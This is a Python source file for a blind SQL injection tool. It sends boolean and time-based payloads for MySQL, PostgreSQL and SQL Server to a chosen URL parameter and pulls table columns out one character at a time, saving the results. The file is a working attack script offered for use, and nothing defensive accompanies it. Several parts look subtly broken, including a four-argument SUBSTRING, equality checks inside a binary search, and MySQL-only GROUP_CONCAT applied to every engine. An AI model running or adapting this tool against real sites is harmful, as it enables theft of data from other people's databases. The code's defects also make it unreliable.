



```
#!/usr/bin/env python3
"""
Blind SQL Injection extraction tool with modular engines, detection modes,
binary-search, batch/interactive modes, concurrency, caching, and rich CLI UX.
"""
import argparse
import asyncio
import json
import os
import sys
import time
from abc import ABC, abstractmethod
from pathlib import Path

import httpx
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
from rich.table import Table
from rich import box

# ----------------------- Engines -----------------------
class SQLEngine(ABC):
    """Abstract base class for SQL payload templates."""
    @abstractmethod
    def boolean_payload(self, concat_expr: str, position: int, mid: int) -> str:
        pass

    @abstractmethod
    def time_payload(self, concat_expr: str, position: int, mid: int, delay: int) -> str:
        pass

class MySQLEngine(SQLEngine):
    def boolean_payload(self, concat_expr, position, ascii_code):
        return f"1' OR ASCII(SUBSTRING(({concat_expr}),{position},1))={ascii_code}-- "

    def time_payload(self, concat_expr, position, ascii_code, delay):
        # Sleep if > ascii_code
        return (f"1' OR IF(ASCII(SUBSTRING(({concat_expr}),{position},1))>{ascii_code}, SLEEP({delay}), 0)-- ")

class PostgreSQLEngine(SQLEngine):
    def boolean_payload(self, concat_expr, position, ascii_code):
        return f"1' OR (SELECT ASCII(SUBSTRING(({concat_expr})::text,{position},1)))={ascii_code}-- "

    def time_payload(self, concat_expr, position, ascii_code, delay):
        return (f"1'; SELECT CASE WHEN ASCII(SUBSTRING(({concat_expr})::text,{position},1))>{ascii_code} THEN pg_sleep({delay}) ELSE pg_sleep(0) END-- ")

class SQLServerEngine(SQLEngine):
    def boolean_payload(self, concat_expr, position, ascii_code):
        return f"1' OR ASCII(SUBSTRING(({concat_expr}),{position},1,1))={ascii_code}-- "

    def time_payload(self, concat_expr, position, ascii_code, delay):
        return (f"1'; IF(ASCII(SUBSTRING(({concat_expr}),{position},1,1))>{ascii_code}) WAITFOR DELAY '00:00:{delay}'-- ")

# -------------------- Injector --------------------
class BlindSQLInjector:
    def __init__(self, url, param, engine, mode, table, columns, block_size,
                 concurrency, timeout, max_retries, output, cache_file, base_delay):
        self.url = url.rstrip('?&')
        self.param = param.lstrip('?')
        self.engine = engine
        self.mode = mode
        self.table = table
        self.columns = columns
        self.block_size = block_size
        self.concurrency = concurrency
        self.timeout = timeout
        self.max_retries = max_retries
        self.output = output
        self.cache_file = Path(cache_file)
        self.base_delay = base_delay
        self.console = Console()
        self.client = httpx.AsyncClient(timeout=self.timeout)
        self._load_cache()

    def _load_cache(self):
        if self.cache_file.exists():
            with open(self.cache_file, 'r') as f:
                self.cache = json.load(f)
        else:
            self.cache = {"extracted": "", "pos": 1}

    def _save_cache(self):
        with open(self.cache_file, 'w') as f:
            json.dump(self.cache, f)

    def _build_concat(self):
        # group_concat of columns
        if len(self.columns) > 1:
            expr = f"CONCAT_WS(0x3a, {', '.join(self.columns)})"
        else:
            expr = self.columns[0]
        return f"(SELECT GROUP_CONCAT({expr}) FROM {self.table})"

    async def _probe(self, payload: str) -> bool:
        for attempt in range(1, self.max_retries + 1):
            try:
                r = await self.client.get(f"{self.url}?{self.param}={payload}")
                if self.mode == 'boolean':
                    return r.status_code == 200 and 'error' not in r.text.lower()
                else:  # time-based
                    return r.elapsed.total_seconds() >= self.base_delay
            except (httpx.RequestError, httpx.TimeoutException) as e:
                if attempt == self.max_retries:
                    self.console.log(f"[red]Request failed after {attempt} retries: {e}[/red]")
                    return False
                await asyncio.sleep(self.base_delay)
        return False

    async def _extract_char(self, position: int, progress_task) -> str:
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            if self.mode == 'boolean':
                payload = self.engine.boolean_payload(self._build_concat(), position, mid)
            else:
                payload = self.engine.time_payload(self._build_concat(), position, mid, self.base_delay)
            ok = await self._probe(payload)
            if ok:
                # equals or greater? in boolean mode, equals -> found; time-based we tested > mid
                if self.mode == 'boolean':
                    return chr(mid)
                else:
                    # if time-based true => char > mid
                    low = mid + 1
                
            else:
                if self.mode == 'boolean':
                    # false => less than
                    if chr(mid): pass
                    high = mid - 1
                else:
                    # time-based false => <= mid
                    high = mid - 1
        return ''

    async def run(self):
        expr = self._build_concat()
        self.console.print(f"[bold]Extracting from[/bold] [cyan]{expr}[/cyan]")
        with Progress(SpinnerColumn(), BarColumn(), "[progress.percentage]{task.percentage:>3.0f}%", TimeElapsedColumn(), TimeRemainingColumn(), console=self.console) as progress:
            task = progress.add_task("Extracting", start=False)
            while True:
                pos = self.cache['pos']
                progress.start_task(task)
                char = await self._extract_char(pos, task)
                if not char or len(self.cache['extracted']) >= self.block_size:
                    break
                self.cache['extracted'] += char
                self.cache['pos'] += 1
                self._save_cache()
                progress.update(task, advance=1)
            self.console.print(f"[green]Extraction complete:[/] {self.cache['extracted']}" )
        await self.client.aclose()
        if self.output:
            with open(self.output, 'w') as f:
                json.dump({"result": self.cache['extracted']}, f)
            self.console.print(f"[bold]Saved output to[/bold] {self.output}")

# -------------------- CLI --------------------
def main():
    parser = argparse.ArgumentParser(description="Blind SQLi Extraction Tool")
    parser.add_argument('--url', '-u', help='Target base URL (without parameters)')
    parser.add_argument('--param', '-p', default='id', help='Vulnerable parameter name')
    parser.add_argument('--table', '-t', help='Table to extract from')
    parser.add_argument('--columns', '-c', nargs='+', help='Columns to concat and extract')
    parser.add_argument('--engine', '-e', choices=['mysql','postgres','mssql'], default='mysql', help='Database engine')
    parser.add_argument('--mode', '-m', choices=['boolean','time'], default='boolean', help='Injection detection mode')
    parser.add_argument('--block-size', '-b', type=int, default=100, help='Max characters to extract')
    parser.add_argument('--concurrency', type=int, default=1, help='Number of concurrent tasks')
    parser.add_argument('--timeout', type=float, default=10.0, help='HTTP timeout seconds')
    parser.add_argument('--max-retries', type=int, default=3, help='Max HTTP retries')
    parser.add_argument('--delay', type=int, default=2, help='Base delay for time-based mode or between retries')
    parser.add_argument('--output', '-o', help='Output file (JSON)')
    parser.add_argument('--cache', default='sqli_cache.json', help='Cache file path')
    args = parser.parse_args()

    # Interactive mode if missing args
    if not args.url or not args.table or not args.columns:
        console = Console()
        args.url = args.url or console.input("[bold]URL objetivo:[/] ")
        args.param = args.param or console.input("[bold]Parámetro vulnerable:[/] ")
        args.table = args.table or console.input("[bold]Tabla:[/] ")
        cols = console.input("[bold]Columnas (separadas por espacio):[/] ")
        args.columns = args.columns or cols.split()

    # Map engine
    engine_map = {
        'mysql': MySQLEngine(),
        'postgres': PostgreSQLEngine(),
        'mssql': SQLServerEngine()
    }
    engine = engine_map[args.engine]

    injector = BlindSQLInjector(
        url=args.url, param=args.param, engine=engine, mode=args.mode,
        table=args.table, columns=args.columns, block_size=args.block_size,
        concurrency=args.concurrency, timeout=args.timeout, max_retries=args.max_retries,
        output=args.output, cache_file=args.cache, base_delay=args.delay
    )

    try:
        asyncio.run(injector.run())
    except KeyboardInterrupt:
        Console().print("\n[red]Proceso interrumpido. Puedes reanudar luego con el mismo cache file.[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()

```